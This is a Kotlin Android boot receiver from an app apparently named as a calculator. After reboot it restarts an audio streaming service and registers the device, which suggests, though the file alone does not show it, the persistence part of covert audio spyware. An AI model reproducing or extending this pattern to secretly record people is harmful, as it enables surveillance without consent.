package com.dp.calculator

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log

class BootReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "BootReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED ||
            intent.action == "android.intent.action.QUICKBOOT_POWERON") {

            Log.d(TAG, "Boot completed, checking for active session")

            // Check if there was an active streaming session
            val prefs = context.getSharedPreferences("device_prefs", Context.MODE_PRIVATE)
            val wasStreaming = prefs.getBoolean("was_streaming", false)

            if (wasStreaming) {
                Log.d(TAG, "Restarting audio service")

                // Restart the audio service
                val serviceIntent = Intent(context, AudioService::class.java).apply {
                    action = AudioService.ACTION_START
                }
                context.startForegroundService(serviceIntent)

                // Register device
                DeviceRegistrar.getDeviceId(context)
            }
        }
    }
}
